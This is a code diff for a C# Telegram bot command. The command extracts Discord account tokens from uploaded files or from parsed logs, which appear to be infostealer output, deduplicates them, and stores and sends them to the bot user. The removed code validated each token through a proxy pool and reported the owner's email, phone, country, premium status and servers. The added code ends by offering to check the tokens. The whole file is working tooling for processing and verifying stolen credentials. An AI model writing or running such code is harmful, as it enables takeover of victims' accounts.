@@ -1,19 +1,18 @@
 using System.Text;
 
 using Bot.Core.Models;
-using Bot.Core.Models.Checkers.Abstractions;
 using Bot.Core.Models.Commands.Abstractions;
 using Bot.Core.Models.Commands.Base;
 using Bot.Core.Models.Parsers.Abstractions;
-using Bot.Services.Proxies.Services;
+using Bot.Services.Files.System.Models;
+using Bot.Services.Files.System.Services;
+using Bot.Services.Files.Telegram.Models;
+using Bot.Services.Files.Telegram.Services;
+using Bot.Telegram.Commands.Common;
 
 using Hangfire;
 
 using Injectio.Attributes;
-
-using Microsoft.AspNetCore.Components;
-
-using Newtonsoft.Json;
 
 using TL;
 
@@ -22,14 +21,15 @@ using WTelegram;
 namespace Bot.Telegram.Commands.User.Services {
 	[RegisterTransient<ICommand<UpdateNewMessage>>(ServiceKey = Keys.Services.Discord), RegisterTransient<ICommand<UpdateBotCallbackQuery>>(ServiceKey = Keys.Services.DiscordCallback)]
 	public class Discord(
+		//
 		Client client,
-		Proxies proxies,
+		SystemFilesRepository files_system,
+		TelegramFilesRepository files_telegram,
 		IParserStream<Bot.Services.Discord.Models.User> parser,
-		IChecker<Bot.Services.Discord.Models.User> checker,
+		
+		//
 		IConfiguration config,
 		ILogger<Discord> logger) : BaseView(client) {
-		private ICollection<Bot.Services.Discord.Models.User>? _tokens = null;
-		private string? _path = null; 
 
 		#region BuildMessage
 
@@ -51,31 +51,12 @@ namespace Bot.Telegram.Commands.User.Services {
 
 		#endregion
 
-		protected override async Task<bool> IsValidAsync(object args, TL.User user) {
-			if (args is UpdateNewMessage {message: Message {media: MessageMediaDocument {document: Document {mime_type: "text/plain"} document}}}) {
-				using (var memory = new MemoryStream()) {
-
-					await client.DownloadFileAsync(document, memory);
-
-					memory.Seek(0, SeekOrigin.Begin);
-
-					using (var reader = new StreamReader(memory)) {
-						_tokens = (await reader.ReadToEndAsync()).Split('\n').Where(x => !string.IsNullOrEmpty(x)).Select(x => (Bot.Services.Discord.Models.User)x).ToList();
-					}
-				}
-			} else if (args is UpdateBotCallbackQuery { data: var data }) {
-				_path = config.GetPath(data, Paths.Extracted).path;
-			} else {
-				return false;
-			}
-
-			return true;
+		protected override Task<bool> IsValidAsync(object args, TL.User user) {
+			return Task.FromResult(args is UpdateNewMessage {message: Message {media: MessageMediaDocument {document: Document {mime_type: "text/plain"}}}} or UpdateBotCallbackQuery {data: not null});
 		}
 
 		protected override Task ProcessAsync(object args, TL.User user) {
-			BackgroundJob.Enqueue(() => InvokeAsync(_path, _tokens, user));
-			
-			return Task.CompletedTask;
+			return Task.Run(() => BackgroundJob.Enqueue(() => InvokeAsync(args, user)));
 		}
 
 		protected override Task<ReplyInlineMarkup?> DefaultMarkup(object args, TL.User user) {
@@ -91,60 +72,72 @@ namespace Bot.Telegram.Commands.User.Services {
 		}
 
 		// Hangfire
-		public async Task InvokeAsync(string? path, ICollection<Bot.Services.Discord.Models.User>? tokens, TL.User user) {
+		public async Task InvokeAsync(object args, TL.User user) {
+			ICollection<string>? tokens = null;
+			string name = "";
+			int? message_id = null;
+            
 			logger.LogInformation("[Discord] Parsing tokens");
-			tokens ??= await parser.FromLogs(path!).ToListAsync();
-					
-			logger.LogInformation("[Discord] Taking proxy");
-			var proxy_list = await proxies.TakeAsync(int.Parse(config["Multithreading:Proxy:MaxThreads"]!)).ToListAsync();
+			switch (args) {
+				case UpdateNewMessage {message: Message {media: MessageMediaDocument {document: Document {mime_type: "text/plain"} document}}}:
+					name = document.Filename.Split('.')[0];
+				
+					using (var memory = new MemoryStream()) {
 
-			logger.LogInformation("[Discord] Start processing");
-			tokens.WithThreads(
-				int.Parse(config["Multithreading:Proxy:MaxThreads"]!),
-				async (account, index) => {
-					var proxy = proxy_list[index];
+						await client.DownloadFileAsync(document, memory);
 
-					using (var http = (HttpClient)proxy) {
-						return await checker.CheckAsync(account, http) && await checker.DetailsAsync(account, http);
+						memory.Seek(0, SeekOrigin.Begin);
+
+						using (var reader = new StreamReader(memory)) {
+							tokens = (await reader.ReadToEndAsync()).Split('\n').Where(x => !string.IsNullOrEmpty(x)).ToList();
+						}
 					}
-				},
-				async (account, _) => {
-					var text = $$"""
-								 {{account.Username}}
+					break;
+				case UpdateBotCallbackQuery { data: var data, msg_id: var msg_id }:
+					message_id = msg_id;
+					
+					(name, var path) = config.GetPath(data, Paths.Extracted);
 
-								 Token: `{{account.Token}}`
-								 Email: {{(string.IsNullOrEmpty(account.Email) ? "None" : account.Email)}}
-								 Phone: {{(string.IsNullOrEmpty(account.Phone) ? "None" : account.Phone)}}
-								 Country: {{(string.IsNullOrEmpty(account.CountryCode) ? "Unknown" : account.CountryCode)}}
-								 Verified: {{(account.Verified ? "True" : "False")}}
-								 Premium: {{account.PremiumType.ToString()}}
-
-								 Guilds: {{account.Guilds.Count}}
-
-								 {{string.Join('\n', account.Guilds.Select(x => $"\tName: {x.Name}\n\tStatus: {(x.IsOwner ? "Owner" : "Member")}\n"))}}
-								 """;
-
-#if DEBUG
-					logger.LogDebug("[Discord] Try to send: \n{account}\n{content}", JsonConvert.SerializeObject(account, Formatting.Indented), text);
-#endif
-                            
-					var entities = client.MarkdownToEntities(ref text);
-							
-					await client.SendMessageAsync(
-						user,
-						text,
-						media: account.AvatarId is not null ? new InputMediaPhotoExternal {
-							url = $"https://cdn.discordapp.com/avatars/{account.Id}/{account.AvatarId}.webp"
-						} : null,
-						entities: entities
-					);
+					tokens = await parser.FromLogs(path).Select(x => x.Token).Distinct().ToListAsync();
+					break;
+			}
+			
+			logger.LogInformation("[Discord] Parsing completed");
+			
+			TelegramFile telegram;
+			SystemFile system;
+            
+			using (var memory = new MemoryStream()) {
+				// Write to stream
+				using (var writer = new StreamWriter(memory, leaveOpen: true)) {
+					foreach (var token in tokens) {
+						await writer.WriteLineAsync(token);
+					}
 				}
+				
+				// Save system
+				system = await files_system.CreateAsync(memory, new(name, "txt", "Discord"), false);
+				
+				await files_system.AddAsync(system);
+
+				// Save telegram
+				telegram = await files_telegram.CreateAsync(memory, new(name, "txt", "Discord", "text/plain"), false);
+
+				await files_telegram.AddAsync(telegram);
+			}
+
+			var text = "#discord";
+			var entities = client.MarkdownToEntities(ref text);
+
+			await client.Messages_SendMedia(
+				user,
+				telegram,
+				text,
+				Random.Shared.NextInt64(),
+				entities: entities
 			);
 			
-			logger.LogInformation("[Discord] Checking completed");
-			foreach (var proxy in proxy_list) {
-				await proxy.DisposeAsync();
-			}
+			await new ConfirmationCommand(client).ExecuteAsync(user, new(message_id, Keys.Services.DiscordCheckCallback, Keys.StartCallback, "Do you wanna check tokens?", system.Id));
 		}
 	}
 }
